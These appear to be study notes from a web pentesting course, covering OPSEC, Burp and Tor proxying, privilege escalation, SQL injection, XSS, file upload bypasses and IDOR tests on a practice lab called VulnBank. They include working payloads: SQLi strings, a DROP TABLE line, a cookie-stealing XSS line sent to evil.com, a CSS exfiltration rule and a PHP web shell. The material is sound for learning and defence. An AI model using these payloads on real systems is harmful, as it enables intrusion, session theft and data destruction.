# Day 14 — Web Attack Techniques
### OPSEC, Proxies, Access Control, Injection, File Uploads & VulnBank Practice

**Date:** Sunday May 03, 2026

---

## 1. OPSEC — Operational Security

OPSEC = protecting your own identity and actions during a pentest or red team operation.

**The core question:** what can the target see about you?

| What leaks | What it reveals |
|---|---|
| Your real IP | Your location, ISP, identity |
| User-Agent string | Browser, OS, tooling (e.g. `python-requests/2.28`) |
| Timing patterns | Working hours, timezone, automation |
| DNS queries | Domains you're investigating |
| TLS fingerprint (JA3) | What tool is making the connection |

**Good OPSEC habits in a pentest:**
- Use a VPN or dedicated pentest VM — never your personal IP
- Rotate User-Agent strings when doing active scanning
- Slow down scan rates — aggressive scans leave obvious log signatures
- Use a dedicated email/account for bug bounty — not your real identity
- Clear browser history and cookies when switching contexts

---

## 2. Proxy

A proxy sits between you and the target — all traffic flows through it.

```
You → Proxy → Target
         ↑
    Intercept, modify, replay
```

### Types of proxies in security

**HTTP/HTTPS Proxy (Burp Suite, OWASP ZAP)**
- Intercepts browser traffic
- Lets you modify requests before they hit the server
- Core tool for web app pentesting

**SOCKS Proxy**
- Lower level — tunnels any TCP traffic (not just HTTP)
- Used with tools like proxychains

**Transparent Proxy**
- Target doesn't know traffic is being proxied
- Used in corporate environments, WAFs, CDNs

### Setting up Burp as a proxy
```
Browser → HTTP Proxy: 127.0.0.1:8080 → Burp Suite → Target
```

To intercept HTTPS:
1. Install Burp's CA certificate in your browser
2. Burp performs a man-in-the-middle on the TLS session
3. You see decrypted HTTPS traffic in Burp

### proxychains — route terminal tools through a proxy
```bash
# Config: /etc/proxychains.conf
# Add at bottom:
socks5  127.0.0.1  9050   # Tor
# or
http    127.0.0.1  8080   # Burp

# Usage
proxychains nmap -sT target.com
proxychains curl http://target.com
```

---

## 3. Tor

Tor (The Onion Router) anonymises traffic by routing it through 3 volunteer relays, each only knowing the previous and next hop.

```
You → Guard node → Middle node → Exit node → Target
       (knows you)               (knows target)
       No single node knows both source AND destination
```

**Layers of encryption:** each hop decrypts one layer — like peeling an onion.

**Using Tor in practice:**
```bash
# Install
sudo pacman -S tor

# Start service
sudo systemctl start tor

# Tor runs as SOCKS5 proxy on 127.0.0.1:9050
# Route tools through it with proxychains

# Check your exit IP
proxychains curl https://ifconfig.me
```

**Limitations for pentesting:**
- Very slow — not suitable for port scans or heavy fuzzing
- Exit nodes are publicly listed — many targets block known Tor exit IPs
- Does NOT protect you from application-level deanonymisation
  (e.g. logging into your real account through Tor)
- Illegal activity through Tor is still illegal — Tor ≠ immunity

---

## 4. User Manipulation / Social Engineering (Access Control Context)

Access control depends not just on technical enforcement but on human behaviour.

**Manipulation vectors:**
- **Phishing** — fake login page harvests credentials → attacker logs in as victim
- **Pretexting** — impersonating IT support to get credentials reset
- **Password reuse** — leaked credentials from one site work on another
- **Session hijacking** — steal a logged-in user's session cookie and impersonate them

**Why this matters for access control:**
Even perfect code-level access control fails if an attacker can trick a user into handing over their session or credentials. The weakest link is often human.

---

## 5. Vertical Privilege Escalation

Accessing functionality or data at a **higher privilege level** than your account should allow.

```
Normal user → Admin function
```

**Examples:**
- Changing `?role=user` to `?role=admin` in a request
- Calling `/api/admin/delete-user` as a regular user
- Modifying a JWT payload: `"is_admin": false` → `"is_admin": true`
- Accessing `/admin` panel that only checks a hidden form field

**How to test:**
1. Log in as a normal user, map all accessible endpoints in Burp
2. Log in as admin, map all admin endpoints
3. Log out admin, replay admin requests as normal user
4. Watch for 200 OK instead of 403

---

## 6. Horizontal Privilege Escalation

Accessing **another user's data** at the same privilege level.

```
User A → User B's data (same role, different account)
```

**Examples:**
- `GET /api/account?id=1002` when you are user 1003
- Changing an order ID in a URL to view another user's order
- Accessing another user's profile by manipulating a cookie value

**Key test:** change any user-identifying parameter in a request and see if you get someone else's data.

---

## 7. Injection

Injection = inserting attacker-controlled input into a query, command, or interpreter that the application runs.

**The root cause:** user input is concatenated into a query without sanitisation.

---

## 8. SQL Injection

The application builds a SQL query using unsanitised user input.

**Vulnerable code example:**
```python
query = "SELECT * FROM users WHERE username = '" + username + "'"
# Input: admin' OR '1'='1
# Result: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
# Returns ALL users — auth bypassed
```

**Basic payloads:**
```sql
' OR '1'='1          -- always true, bypass login
' OR 1=1--           -- comment out rest of query
' UNION SELECT null,null,null--   -- union-based data extraction
'; DROP TABLE users--  -- destructive (never in real testing)
```

**Types of SQLi:**

| Type | How it works |
|---|---|
| In-band (Error) | Error messages reveal DB structure |
| In-band (Union) | UNION SELECT appends attacker data to results |
| Blind Boolean | Ask true/false questions, infer data from response differences |
| Blind Time-based | `SLEEP(5)` — if response delays, query ran |
| Out-of-band | Data sent to attacker-controlled server (DNS/HTTP) |

**Testing for SQLi:**
```
Input: '
If error → likely injectable

Input: ' OR '1'='1
If behaviour changes → injectable

Input: ' OR SLEEP(5)--
If response delays 5s → injectable (blind)
```

**Tools:** sqlmap (automated), Burp Scanner, manual payloads

**VulnBank SQLi test:**
```bash
# Test login with:
username: admin'--
password: anything
# If login succeeds → SQLi confirmed
```

---

## 9. XSS — Cross-Site Scripting

Attacker injects JavaScript that runs in another user's browser in the context of the vulnerable site.

**Root cause:** user input is reflected in the HTML response without encoding.

### Types

**Reflected XSS** — payload is in the URL, executes immediately when victim visits the link
```
https://site.com/search?q=<script>alert(1)</script>
```

**Stored XSS** — payload is saved to the database, executes for every user who views the page
```
Comment field: <script>document.location='https://evil.com/?c='+document.cookie</script>
# Every user who loads the page sends their cookie to attacker
```

**DOM-based XSS** — payload manipulates the DOM without going to the server at all
```javascript
// Vulnerable JS:
document.getElementById('output').innerHTML = location.hash.slice(1)
// Payload in URL: #<img src=x onerror=alert(1)>
```

**Basic payloads:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(document.cookie)>
<svg onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
```

**What an attacker can do with XSS:**
- Steal session cookies → account takeover
- Redirect user to phishing page
- Log keystrokes
- Perform actions on behalf of the user (CSRF-like)
- Deface the page

**Testing in VulnBank:**
- Find any input field that reflects output
- Try `<script>alert(1)</script>` — if alert box appears → XSS confirmed
- Try in search, comments, profile name, username fields

---

## 10. Mouse Hover Attacks

A UI redressing technique where malicious content is triggered when the user hovers over an element — no click required.

**How it works:**
```css
a:hover { /* triggers on mouse hover */ }
```

**CSS-based information leakage:**
```css
a[href^="https://internal.corp.com"]:hover::after {
  content: url('https://evil.com/log?found=internal-link');
}
```
When the user hovers over an internal link, a request fires to the attacker's server — confirming the link exists.

**Drag & drop attacks:**
- User hovers and drags content they can see (e.g. a token in a form field)
- Attacker's page captures the dragged content

**Relevance:** these attacks bypass click-based defences and work even on pages without XSS if CSS injection is possible.

---

## 11. File Upload Vulnerabilities

**The risk:** if an attacker can upload a malicious file that the server then executes, that's Remote Code Execution (RCE).

### Attack vectors

**1. Upload a web shell**
```php
<?php system($_GET['cmd']); ?>
# Save as shell.php
# Upload, then browse to /uploads/shell.php?cmd=id
```

**2. MIME type bypass** — server checks Content-Type header, not actual file content
```
Normal: Content-Type: image/jpeg
Bypass: Content-Type: image/jpeg  ← keep this
        Filename: shell.php        ← change this
```

**3. Extension bypass** — server blocks `.php` but allows `.php5`, `.phtml`, `.PHP`, `.php.jpg`

**4. Magic bytes bypass** — server checks file signature (first bytes)
```
Add JPEG magic bytes before PHP code:
FF D8 FF E0  (JPEG header) + <?php system($_GET['cmd']); ?>
```

**5. SVG upload → XSS** — SVG files can contain embedded JavaScript
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
```

**6. Path traversal on upload** — filename: `../../shell.php` uploaded to parent directory

### Defence checklist
- Validate file extension server-side (whitelist, not blacklist)
- Validate actual file content (magic bytes + MIME)
- Rename uploaded files server-side (remove original filename)
- Store uploads outside web root — never executable location
- Use a CDN/object store (S3) for uploads — no server-side execution

### Testing in VulnBank
```
1. Find file upload endpoint
2. Try uploading a .php file → observe response
3. If blocked, try shell.php5 / shell.phtml / shell.PHP
4. Check if uploaded file is accessible at /uploads/shell.php
5. If accessible: GET /uploads/shell.php?cmd=id → RCE confirmed
```

---

## 12. IDOR (recap — applied in VulnBank)

**VulnBank test pattern:**
```bash
# After logging in as user A, find requests like:
GET /api/transactions?account=1001
GET /api/user/profile?id=44

# Change to another account/user ID:
GET /api/transactions?account=1002  ← see another user's transactions?
GET /api/user/profile?id=45         ← see another user's profile?

# Check Burp history for any ID that appeared in a response
# Those IDs gathered from LLM recon phase are the ones to test here
```

---

## 13. VulnBank — What We Tested

| Attack | Endpoint tested | Result |
|---|---|---|
| SQLi | Login form | Tested `admin'--` |
| Horizontal IDOR | `/api/transactions?account=` | Enumerated account numbers from LLM recon |
| Vertical escalation | JWT `is_admin` field | Modified payload, re-signed with cracked secret |
| XSS | Profile/comment fields | Reflected input |
| File upload | Upload endpoint | Tested `.php` and extension bypasses |
| Mass assignment | Registration/update body | Injected `"isAdmin": true` in JSON body |

---

## Quick Reference

```
OPSEC:
  - Never use real IP for active recon
  - Tor = anonymity, not magic; SOCKS5 on 127.0.0.1:9050
  - proxychains routes any tool through Tor or Burp

Proxy = intercept + modify traffic (Burp on 127.0.0.1:8080)

Vertical escalation  = low priv → high priv (user → admin)
Horizontal escalation = same priv, different account (user A → user B data)

SQLi test:   single quote '  then  ' OR '1'='1
XSS test:    <script>alert(1)</script>  then  <img src=x onerror=alert(1)>
File upload: try .php → blocked? try .php5 .phtml .PHP → browse to /uploads/

IDOR in VulnBank: change account/user IDs from LLM recon phase
JWT escalation:    crack secret → modify is_admin → re-sign → replay

Mouse hover: CSS-triggered requests, no user click needed, bypasses click defences
```
